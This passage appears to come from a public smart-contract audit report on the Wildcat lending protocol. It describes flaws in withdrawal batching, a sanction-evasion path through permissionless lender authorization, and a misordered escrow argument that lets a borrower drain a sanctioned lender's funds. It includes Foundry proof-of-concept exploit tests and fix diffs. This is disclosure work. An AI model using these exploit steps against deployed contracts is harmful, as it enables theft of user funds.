nowassertEq(market.getWithdrawalBatch(uint32(block.timestamp)).normalizedAmountPaid,1e18);assertEq(market.getWithdrawalBatch(uint32(block.timestamp)).scaledTotalAmount,2e18);assertEq(market.getWithdrawalBatch(uint32(block.timestamp)).scaledAmountBurned,1e18);// what happened is alice and bob have withdrawn 1e18 and 5e17 respectively// but the batch is 1e18uint128normalizedAmountPaid=market.getWithdrawalBatch(uint32(block.timestamp)).normalizedAmountPaid;uint128aliceWithdrawn=market.getAccountWithdrawalStatus(address(alice),uint32(block.timestamp)).normalizedAmountWithdrawn;uint128bobWithdrawn=market.getAccountWithdrawalStatus(address(bob),uint32(block.timestamp)).normalizedAmountWithdrawn;assertGt(aliceWithdrawn+bobWithdrawn,normalizedAmountPaid);}
Tools Used
Foundry
Recommendation
Review the protocol’s withdrawal mechanism and consider adjusting the behaviour of withdrawals whenwithdrawalBatchDurationis set to zero to ensure that lenders cannot withdraw more than their pro-rata share of the batch’s paid assets.
d1ll0n (Wildcat) confirmed and commented:
Thank you! Good catch - going to fix this by changing the assertion inexecuteWithdrawalfrom:if(expiry>block.timestamp) {revertWithdrawalBatchNotExpired();}to:if(expiry>=block.timestamp) {revertWithdrawalBatchNotExpired();}so that it’s guaranteed the withdrawal batch can not be added to when it’s in a state that allows execution.
laurenceday (Wildcat) commented:
Mitigatedhere.

[H-05] Lenders can escape the blacklisting of their accounts because they can move their MarketTokens to different accounts and gain theWithdrawOnlyRole on any account they want
Submitted by0xStalin, also found byelprofesor,Infect3d,serial-coder,xeros,radev_sw,jasonxiale,ast3ros,QiuhaoLi,Fulum, TrungOre (1,2), SandNallani (1,2),SovaSlava,kodyvim,0xbepresent,Eigenvectors,3docSec,marqymarq10,ayden,HChang26, cu5t0mpeo (1,2), 0xCiphky (1,2), rvierdiiev (1,2),nobody2018,YusSecurity,gizzy,nisedo,bdmcbri,ZdravkoHr,0xComfyCat, andmax10afternoon
Lenders can escape the sanctioning of their account in any market.
Proof of Concept
Before diving into the details of how the lenders can escape the sanctioning of their account, first, let’s analyze how a lender can be excised from a Market:
When someone callsnukeFromOrbitwithin that market while flagged as sanctioned by the Chainanalysis oracle.When the lender invokesexecuteWithdrawalwhile flagged as sanctioned by the Chainalysis oracle
In either of the two options, the execution flow calls theSentinel::isSanctioned()functionto verify if the account(lender) is sanctioned by the borrower of the market
By analyzing theSentinel::isSanctioned()function, it can be noted that the lender’s account must have been sanctioned in the Oracle first before the account is finally sanction in a Market.
WildcatSanctionsSentinel.sol
functionisSanctioned(addressborrower,addressaccount)publicviewoverridereturns(bool) {//@audit-info => sanctionOverrides[borrower][account] must be false <==> sanction must not be overridden for this function to return true!//@audit-info => If sanctionOverrides[borrower][account] is set to true, this function will return false, as if the account would not be sanctioned//@audit-info => For this function to return true, the account's sanction should have not been overridden (it's set to false), and the account must have been sanctioned in the ChainalysisSanctionsList Oracle.return!sanctionOverrides[borrower][account] &&IChainalysisSanctionsList(chainalysisSanctionsList).isSanctioned(account);}
Now, based on the previous explanation, we know that the lender’s account needs to be sanctioned in the Chainalysis Oracle before theSentinel::isSanctioned()functionis called.
This opens up the doors for lenders who realize that their account has been sanctioned in the Chainalysis Oracle to move their MarketTokens to different accounts before the lender’s account is fully blocked in the Market. You may be wondering what’s the point of transferring tokens to accounts that have not been granted any role in the Market, I’ll explain more about this shortly.
The lender transfers their MarketTokens to different accounts using theWildcatMarketToken::transfer()function. As a result, the lender’s account that is sanctioned in the Chainalysis Oracle has no MarketTokens anymore; all those tokens have been moved to other accounts.
Now, at this point, anybody could call thenukeFromOrbit()function to fully sanction the lender’s account in a specific Market. Ether way, the Lender has already moved their tokens to other accounts.
At this point, the lender’s MarketTokens were distributed among different accounts of their own. Such accounts have never interacted with the Market, so their current role is theNullRole.
Everything might look fine because the accounts where the tokens were sent have no permissions to interact with the Market, but there is a bug that allows lenders to gain theWithdrawOnlyRole on any account they want, without having the consent of the borrower.
This problem is located in theWildcatMarketController::updateLenderAuthorization()function. The reason of this problem will be explained in the below code walkthrough:
In short, the Lender will be able to set theWithdrawOnlyRole to any account they wish. The reason is that any account that is not registered in the_authorizedLendersvariable of the Controller will forward the value of_isAuthorizedas false. In theWildMarketConfig::updateAccountAuthorization()function, because the value of_isAuthorizedis false, it will end up granting theWithdrawOnlyRole. This effectively allows any Lender to grant theWithdrawOnlyRole to any account they want to.
WildcatMarketController.sol
//@audit-info => Anybody can call this function and pass a lender and an array of markets where the changes will be applied!functionupdateLenderAuthorization(addresslender,address[]memorymarkets)external{for(uint256i;i<markets.length;i++) {addressmarket=markets[i];if(!_controlledMarkets.contains(market)) {revertNotControlledMarket();}//@audit-info => Forwards the value of the `lender` argument, and depending on the `lender` address is found in the _authorizedLenders EnumerableSet.AddressSet, will be forwarded a true or false accordingly//@audit => If the lender address is not found in the _authorizedLenders variable, it will forward a false to the Market::updateAccountAuthorization() functionWildcatMarket(market).updateAccountAuthorization(lender,_authorizedLenders.contains(lender));}}
EnumerableSet.sol
functioncontains(AddressSetstorageset,addressvalue)internalviewreturns(bool) {//@audit-info => Calls the internal _contains()//@audit-info => If the given value is found it will return true, otherwise it will return false!return_contains(set._inner,bytes32(uint256(uint160(value))));}//@audit-info => The internal function will just return a true or false if the given value is in the set or not, but the tx won't be reverted!/***@devReturns true if the value is in the set. O(1).*/function_contains(Setstorageset,bytes32value)privateviewreturns(bool) {returnset._indexes[value] !=0;}
WildcatMarketConfig.sol
functionupdateAccountAuthorization(address_account,//@audit-info => For any account that is not registered in the `_authorizedLenders` of the Controller, this flag was set as false!bool_isAuthorized)externalonlyControllernonReentrant{MarketStatememorystate=_getUpdatedState();//@audit-info => If the accountAddress is not registered in the storage, the approval role is set to Null//@audit-info => If the account has been blacklisted, tx will revert!Accountmemoryaccount=_getAccount(_account);if(_isAuthorized) {account.approval=AuthRole.DepositAndWithdraw;//@audit => Any account not registered in the Controller will be assigned the WithdrawOnly role.}else{account.approval=AuthRole.WithdrawOnly;}_accounts[_account] =account;_writeState(state);emitAuthorizationStatusUpdated(_account,account.approval);}
At this point, the Lender has been able to move their MarketTokens to different accounts and to grant theWithdrawOnlyRole to all of the accounts they wish to.
Now, they can decide to exit the Market by queuing and executing some withdrawal requests from the different accounts where the MarketTokens were moved. Any of those accounts have now theWithdrawOnlyRole and have a balance of MarketTokens, so the Lender will be able to exit the market from any of those accounts.
Recommended Mitigation Steps
The mitigation for this problem is very straight-forward, by limiting the access to which entities can call theWildcatMarketController::updateLenderAuthorization()function; either only allow the Borrower to call it, or create a type of whitelist of valid actors who are capable of updating the lender’s authorization on the Markets. In this way, the Lenders won’t be capable of granting theWithdrawOnlyRole to any account they want to; thus, they won’t be able even to attempt to escape the sanctions.
WildcatMarketController.sol
-functionupdateLenderAuthorization(addresslender,address[]memorymarkets)external{+functionupdateLenderAuthorization(addresslender,address[]memorymarkets)externalonlyAuthorizedEntities(){for(uint256i;i<markets.length;i++) {addressmarket=markets[i];if(!_controlledMarkets.contains(market)) {revertNotControlledMarket();}WildcatMarket(market).updateAccountAuthorization(lender,_authorizedLenders.contains(lender));}}modifieronlyAuthorizedEntities() {require(msg.sender==<authorizedEntities>, "you are not allowed sir");_;}
Assessed type
Context
0xTheC0der (judge) increased severity to High
laurenceday (Wildcat) commented:
Mitigatedhere.
laurenceday (Wildcat) confirmed

[H-06] Borrower can drain all funds of a sanctioned lender
Submitted byYusSecurity, also found byd3e4,serial-coder,nirlin,xeros,VAD37,DeFiHackLabs,0xKbl,0xDING99YA,Aymen0909,ast3ros,Yanchuan,MiloTruck,AS,sl1,QiuhaoLi,gizzy,SovaSlava,TrungOre,cartlex_,kodyvim,Vagner,KeyKiril,GREY-HAWK-REACH,0xSwahili,ggg_ttt_hhh,3docSec,Silvermist,0xbepresent,tallo,ZdravkoHr,0xCiphky,rvierdiiev,nobody2018,deth, and0xAsen
Lines of code
https://github.com/code-423n4/2023-10-wildcat/blob/c5df665f0bc2ca5df6f06938d66494b11e7bdada/src/WildcatSanctionsSentinel.sol#L96-L97https://github.com/code-423n4/2023-10-wildcat/blob/c5df665f0bc2ca5df6f06938d66494b11e7bdada/src/market/WildcatMarketBase.sol#L173-L174https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketWithdrawals.sol#L166-L170
Impact
TheWildcatMarketBase#_blockAccount()function that is used to block a sanctioned lender contains a critical bug. It incorrectly callsIWildcatSanctionsSentinel(sentinel).createEscrow()with misordered arguments, accidentally creating a vulnerable escrow that enables the borrower to drain all the funds of the sanctioned lender.
The execution of withdrawals (WildcatMarketWithdrawals#executeWithdrawal()) also performs a check if theaccountAddressis sanctioned and if it is, then escrow is created and the amount that was to be sent to the lender is sent to the escrow. That escrow, however, is also created with theaccountandborrowerarguments in the wrong order.
That means whether or not the borrower has anything to do with a sanctioned account and their funds ever, that account will never be able to get their money back in case their sanction gets dismissed.
Proof of Concept
Consider this scenario to illustrate how the issue can be exploited:
Bob The Borrower creates a market.Bob authorizes Larry The Lender as a lender in the created market.Larry deposits funds into the market.Larry gets sanctioned in Chainalysis.Bob invokesWildcatMarket#nukeFromOrbit(larryAddress), blocking Larry and creating a vulnerableWildcatSanctionsEscrowwhere Larry’s market tokens are transferred.Bob authorizes himself as a lender in the market viaWildcatMarketController#authorizeLenders(bobAddress).Bob initiates a withdrawal usingWildcatMarket#queueWithdrawal().After the withdrawal batch duration expires, Bob callsWildcatMarket#executeWithdrawal()and gains access to all of Larry’s assets.
Now, let’s delve into the specifics and mechanics of the vulnerability:
ThenukeFromOrbit()function calls_blockAccount(state, larryAddress), blocking Larry’s account, creating an escrow, and transferring his market tokens to that escrow.
//@audit                                                     Larry//@audit                                                       â†“function_blockAccount(MarketStatememorystate,addressaccountAddress)internal{Accountmemoryaccount=_accounts[accountAddress];// ...account.approval=AuthRole.Blocked;// ...account.scaledBalance=0;addressescrow=IWildcatSanctionsSentinel(sentinel).createEscrow(accountAddress,//@audit â† Larryborrower,//@audit â† Bobaddress(this));// ..._accounts[escrow].scaledBalance+=scaledBalance;// ...}
In the code snippet, notice the order of arguments passed tocreateEscrow():
createEscrow(accountAddress,borrower,address(this));
However, when we examine theWildcatSanctionsSentinel#createEscrow()implementation, we see a different order of arguments. This results in an incorrect construction oftmpEscrowParams:
functioncreateEscrow(addressborrower,//@audit â† Larryaddressaccount,//@audit â† Bobaddressasset)publicoverridereturns(addressescrowContract) {// ...// @audit                        ( Larry  ,   Bob  , asset)// @audit                            â†“         â†“       â†“tmpEscrowParams=TmpEscrowParams(borrower,account,asset);newWildcatSanctionsEscrow{salt:keccak256(abi.encode(borrower,account,asset)) }();// ...}
ThetmpEscrowParamsare essential for setting up the escrow correctly. They are fetched in the constructor ofWildcatSanctionsEscrow, and the order of these parameters is significant:
constructor() {sentinel=msg.sender;(borrower,account,asset) =WildcatSanctionsSentinel(sentinel).tmpEscrowParams();//     â†‘        â†‘       â†‘//(  Larry ,   Bob  , asset) are the params fetched here. @audit}
However, due to the misordered arguments in_blockAccount(), what’s passed astmpEscrowParamsis(borrower = Larry, account = Bob, asset), which is incorrect. This misordering affects thecanReleaseEscrow()function, which determines whetherreleaseEscrow()should proceed or revert.
functioncanReleaseEscrow()publicviewoverridereturns(bool) {//@audit                                                 Larry      Bob//                                                         â†“         â†“return!WildcatSanctionsSentinel(sentinel).isSanctioned(borrower,account);}
The misordered parameters impact the return value ofsentinel.isSanctioned(). It mistakenly checks Bob against the sanctions list, where he is not sanctioned.
//@audit                       Larry              Bob//                               â†“                 â†“functionisSanctioned(addressborrower,addressaccount)publicviewoverridereturns(bool) {return!sanctionOverrides[borrower][account] &&// trueIChainalysisSanctionsList(chainalysisSanctionsList).isSanctioned(account);// false}
ThusisSanctioned()returnsfalseand consequentlycanReleaseEscrow()returnstrue. This allows Bob to successfully executereleaseEscrow()and drain all of Larry’s market tokens:
functionreleaseEscrow()publicoverride{if(!canReleaseEscrow())revertCanNotReleaseEscrow();uint256amount=balance();//@audit                 Bob   Larry's $//                        â†“       â†“IERC20(asset).transfer(account,amount);emitEscrowReleased(account,asset,amount);}
After this, Bob simply needs to authorize himself as a lender in his own market and withdraw the actual assets.
Below is a PoC demonstrating how to execute the exploit. To proceed, please include the following import statements intest/market/WildcatMarketConfig.t.sol:
import'src/WildcatSanctionsEscrow.sol';import"forge-std/console2.sol";
Add the following testtest/market/WildcatMarketConfig.t.solas well:
functiontest_borrowerCanStealSanctionedLendersFunds()external{vm.label(borrower,"bob");// Label borrower for better trace readability// This is Larry The Lenderaddresslarry=makeAddr("larry");// Larry deposists 10e18 into Bob's market_deposit(larry,10e18);// Larry's been a bad guy and gets sanctionedsanctionsSentinel.sanction(larry);// Larry gets nuked by the borrowervm.prank(borrower);market.nukeFromOrbit(larry);// The vulnerable escrow in which Larry's funds get movedaddressvulnerableEscrow=sanctionsSentinel.getEscrowAddress(larry,borrower,address(market));vm.label(vulnerableEscrow,"vulnerableEscrow");// Ensure Larry's funds have been moved to his escrowassertEq(market.balanceOf(larry),0);assertEq(market.balanceOf(vulnerableEscrow),10e18);// Malicious borrower is able to release the escrow due to the vulnerabilityvm.prank(borrower);WildcatSanctionsEscrow(vulnerableEscrow).releaseEscrow();// Malicious borrower has all of Larry's tokensassertEq(market.balanceOf(borrower),10e18);// The borrower authorizes himself as a lender in the market_authorizeLender(borrower);// Queue withdrawal of all fundsvm.prank(borrower);market.queueWithdrawal(10e18);// Fast-forward to when the batch duration expiresfastForward(parameters.withdrawalBatchDuration);uint32expiry=uint32(block.timestamp);// Execute the withdrawalmarket.executeWithdrawal(borrower,expiry);// Assert the borrower has drained all of Larry's assetsassertEq(asset.balanceOf(borrower),10e18);}
Run the PoC like this:
forgetest--match-test test_borrowerCanStealSanctionedLendersFunds -vvvv
Recommended Mitigation Steps
Fix the order of parameters inWildcatSanctionsSentinel#createEscrow(borrower, account, asset):
function createEscrow(-   address borrower,+   address account,-   address account,+   address borrower,address asset) public override returns (address escrowContract) {
Assessed type
Error
laurenceday (Wildcat) commented:
Mitigatedhere.
laurenceday (Wildcat) confirmed

